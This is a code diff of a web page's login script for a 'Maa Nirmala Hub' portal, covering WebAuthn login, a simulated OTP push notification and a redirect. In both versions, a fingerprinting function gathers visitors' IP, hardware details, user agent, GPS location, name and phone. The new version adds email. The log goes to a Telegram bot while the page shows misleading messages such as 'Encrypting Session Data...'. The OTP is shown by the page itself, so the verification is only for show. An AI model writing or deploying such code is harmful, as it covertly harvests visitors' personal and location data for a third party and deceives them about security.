+    // --- 4. METHOD C: NATIVE DEVICE LOCK (WEBAUTHN) ---
+    async function startDeviceLockAuth() {
+        if(!checkInputs()) return;
+        authMethodChosen = "Device Lock/Fingerprint";
+
+        if (window.PublicKeyCredential) {
+            try {
+                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
+                const cred = await navigator.credentials.create({
+                    publicKey: {
+                        challenge: chal, rp: { name: "Maa Nirmala Hub", id: window.location.hostname },
+                        user: { id: new Uint8Array(16), name: uName, displayName: uName },
+                        pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+                        authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
+                        timeout: 60000
+                    }
+                });
+
+                if (cred) {
+                    localStorage.setItem('mnd_hub_auth', 'true');
+                    localStorage.setItem('mnd_hub_n', uName);
+                    localStorage.setItem('mnd_hub_p', uPhone);
+                    
+                    document.getElementById('hubAuthModal').style.display = 'none';
+                    hubOTP = "VERIFIED BY DEVICE OS"; 
+                    triggerSeamlessRedirect(false);
+                }
+            } catch (err) { alert("❌ Device authentication canceled or failed."); }
+        } else { alert("⚠️ Biometrics not supported on this browser."); }
     }
 
-    // --- FAKE PUSH NOTIFICATION & SWIPE LOGIC ---
-    const pushEl = document.getElementById('mndPushNotif');
-    let pushStartX = 0;
+    // --- 5. PUSH NOTIFICATION & SWIPE ENGINE ---
+    const notifEl = document.getElementById('mndPushNotif');
+    let startX = 0;
 
-    function showPushNotification(otpCode) {
-        document.getElementById('mndPushOtpText').innerText = otpCode;
-        pushEl.classList.remove('mnd-push-hidden');
-        pushEl.classList.add('mnd-push-visible');
-        if(typeof playTap === 'function') playTap(); 
-
-        clearTimeout(pushTimeout);
-        pushTimeout = setTimeout(closePushNotif, 60000); // Stays for 1 minute
+    function displayPushNotification(code) {
+        document.getElementById('mndPushOtpText').innerText = code;
+        notifEl.classList.remove('mnd-push-hidden');
+        notifEl.classList.add('mnd-push-visible');
+        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 60000);
     }
-
     function closePushNotif() {
-        pushEl.classList.remove('mnd-push-visible');
-        pushEl.classList.add('mnd-push-hidden');
-        // Reset transform position after it animates up
-        setTimeout(() => { pushEl.style.transform = `translateX(-50%)`; pushEl.style.opacity = '1'; }, 400);
+        notifEl.classList.remove('mnd-push-visible');
+        notifEl.classList.add('mnd-push-hidden');
+        setTimeout(() => { notifEl.style.transform = `translateX(-50%) scale(0.9)`; notifEl.style.opacity = '0'; }, 400);
     }
-
-    // Copy OTP to clipboard
     function copyPushOTP() {
-        navigator.clipboard.writeText(currentHubOTP);
-        const otpText = document.getElementById('mndPushOtpText');
-        otpText.innerText = "COPIED!";
-        setTimeout(() => { otpText.innerText = currentHubOTP; }, 1500);
+        navigator.clipboard.writeText(hubOTP);
+        const txt = document.getElementById('mndPushOtpText');
+        txt.innerText = "COPIED!"; setTimeout(() => { txt.innerText = hubOTP; }, 1500);
     }
-
-    // Swipe Left or Right to Dismiss
-    pushEl.addEventListener('touchstart', e => {
-        pushStartX = e.touches[0].clientX;
-        pushEl.style.transition = 'none'; // Follow finger exactly
+    
+    // Swipe Mechanics
+    notifEl.addEventListener('touchstart', e => { startX = e.touches[0].clientX; notifEl.style.transition = 'none'; }, {passive: true});
+    notifEl.addEventListener('touchmove', e => {
+        let diff = e.touches[0].clientX - startX;
+        notifEl.style.transform = `translateX(calc(-50% + ${diff}px)) scale(1)`;
     }, {passive: true});
-
-    pushEl.addEventListener('touchmove', e => {
-        let currentX = e.touches[0].clientX;
-        let diff = currentX - pushStartX;
-        pushEl.style.transform = `translateX(calc(-50% + ${diff}px))`;
-    }, {passive: true});
-
-    pushEl.addEventListener('touchend', e => {
-        pushEl.style.transition = 'top 0.5s ease, transform 0.3s ease, opacity 0.3s ease';
-        let diff = e.changedTouches[0].clientX - pushStartX;
-        if (Math.abs(diff) > 70) {
-            // Swiped far enough - throw it off screen left or right
-            pushEl.style.transform = `translateX(calc(-50% + ${diff * 5}px))`;
-            pushEl.style.opacity = '0';
-            setTimeout(closePushNotif, 300);
-        } else {
-            // Snap back to center
-            pushEl.style.transform = `translateX(-50%)`;
-        }
+    notifEl.addEventListener('touchend', e => {
+        notifEl.style.transition = 'top 0.6s ease, transform 0.3s ease, opacity 0.3s ease';
+        let diff = e.changedTouches[0].clientX - startX;
+        if (Math.abs(diff) > 80) {
+            notifEl.style.transform = `translateX(calc(-50% + ${diff * 4}px)) scale(0.9)`;
+            notifEl.style.opacity = '0'; setTimeout(closePushNotif, 300);
+        } else { notifEl.style.transform = `translateX(-50%) scale(1)`; }
     });
 
-    // --- 4. VERIFY OTP & REDIRECT ---
+    // --- 6. OTP VERIFICATION ---
     function verifyHubOTP() {
-        const entered = document.getElementById('hubOtpInput').value.trim();
-        if(entered === currentHubOTP && currentHubOTP !== "") {
-            localStorage.setItem('mnd_hub_authorized', 'true');
-            localStorage.setItem('mnd_hub_name', currentUserName);
-            localStorage.setItem('mnd_hub_phone', currentUserPhone);
-            
+        const input = document.getElementById('hubOtpInput').value.trim();
+        if(input === hubOTP && hubOTP !== "") {
+            localStorage.setItem('mnd_hub_auth', 'true');
+            localStorage.setItem('mnd_hub_n', uName);
+            localStorage.setItem('mnd_hub_p', uPhone);
             document.getElementById('hubAuthModal').style.display = 'none';
-            closePushNotif();
-            
-            executeSeamlessRedirect(false); 
-        } else {
-            alert("❌ Incorrect 6-Digit OTP! Please check the notification.");
-        }
+            closePushNotif(); triggerSeamlessRedirect(false); 
+        } else { alert("❌ ACCESS DENIED: Incorrect OTP sequence."); }
     }
 
-    function resetHubLogin() {
-        currentHubOTP = "";
-        document.getElementById('hubStep1').style.display = 'block';
-        document.getElementById('hubStepFaceID').style.display = 'none';
-        document.getElementById('hubStep2').style.display = 'none';
-        document.getElementById('hubOtpInput').value = '';
-        closePushNotif();
-        stopHubCamera();
-    }
-
-    // --- 5. DEVICE FINGERPRINTING LOGIC ---
-    async function gatherDeviceFingerprint(isReturning, methodStr) {
-        let ip = "Masked", battery = "Unknown", network = "Unknown", gpu = "N/A";
-        try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
-        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
-        try { if(navigator.connection) network = `${navigator.connection.effectiveType} (${navigator.connection.type || 'cellular'}) - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+    // --- 7. ENTERPRISE DEVICE FINGERPRINTING ---
+    async function buildDeviceFingerprint(isReturn, methodStr) {
+        let ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
+        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
+        try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
+        try { if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
         try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
 
-        const cores = navigator.hardwareConcurrency || "Unknown";
-        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
-        const browser = navigator.userAgent;
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        
+        const cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+        const browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
         let model = "Unknown Device";
-        if (navigator.userAgentData) { 
-            try { const d = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${d.platform} ${d.model}`; } catch(e){}
-        }
+        if (navigator.userAgentData) { try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
 
-        const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
-        let statusType = isReturning ? "(Auto-Login/Saved Device)" : `(${methodStr} OTP: ${currentHubOTP})`;
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+        let status = isReturn ? "(Saved Auto-Login)" : `(${methodStr} | Code: ${hubOTP})`;
 
-        let locationData = "❌ Location Denied/Unavailable";
-        const getLoc = () => new Promise(res => {
+        let loc = "❌ Location Blocked";
+        const getL = () => new Promise(res => {
             if(!navigator.geolocation) return res("❌ Not Supported");
             navigator.geolocation.getCurrentPosition(
-                pos => res(`✅ Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\n🔗 [Google Maps](http://googleusercontent.com/maps.google.com/8{pos.coords.latitude},${pos.coords.longitude})`),
-                err => res("❌ Location Denied by User")
+                p => res(`✅ [View on Maps](http://googleusercontent.com/maps.google.com/9${p.coords.latitude},${p.coords.longitude})`),
+                e => res("❌ Denied by User")
             );
         });
-        const locTimeout = new Promise(res => setTimeout(() => res("❌ Request Timed Out"), 2500));
-        locationData = await Promise.race([getLoc(), locTimeout]);
+        const locT = new Promise(res => setTimeout(() => res("❌ Timeout"), 2500));
+        loc = await Promise.race([getL(), locT]);
 
-        return `🚨 *SECURE HUB ACCESS LOG* 🚨\n_${statusType}_\n\n👤 *USER IDENTITY*\n• Name: ${currentUserName}\n• Phone: ${currentUserPhone}\n\n📱 *DEVICE FINGERPRINT*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE SPECS*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${battery}\n\n📡 *NETWORK INTEL*\n• IP: ${ip}\n• Type: ${network}\n\n📍 *LOCATION DATA*\n${locationData}\n\n⏰ *Time:* ${time}`;
+        return `🚨 *MND SECURE ACCESS LOG* 🚨\n_${status}_\n\n👤 *IDENTITY MATRIX*\n• Name: ${uName}\n• Phone: ${uPhone}\n• Email: ${uEmail}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
     }
 
-    // --- 6. SEAMLESS REDIRECT ANIMATION ---
-    async function executeSeamlessRedirect(isReturning) {
+    // --- 8. SEAMLESS REDIRECT ---
+    async function triggerSeamlessRedirect(isReturn) {
         const loader = document.getElementById('seamlessHubLoader');
-        const loadText = document.getElementById('hubLoadText');
+        const txt = document.getElementById('hubLoadText');
         loader.style.display = 'flex';
 
-        // Auto-Login sends a text-only log
-        if(isReturning) {
-            const logText = await gatherDeviceFingerprint(true, "Auto");
-            fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
+        if(isReturn) {
+            const logText = await buildDeviceFingerprint(true, "Auto");
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: logText, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: logText, parse_mode: 'Markdown' })
             }).catch(e=>{});
         }
 
-        setTimeout(() => { loadText.innerText = "Establishing Secure Encrypted Connection..."; }, 1000);
-        setTimeout(() => { loadText.innerText = "Synchronizing Hub Data..."; }, 2500);
-        setTimeout(() => { loadText.innerText = "Opening Application..."; }, 3800);
-        
-        setTimeout(() => {
-            window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./');
-        }, 4500);
+        setTimeout(() => { txt.innerText = "Encrypting Session Data..."; }, 1000);
+        setTimeout(() => { txt.innerText = "Opening Application Portal..."; }, 2500);
+        setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
     }
 </script>
     </div>
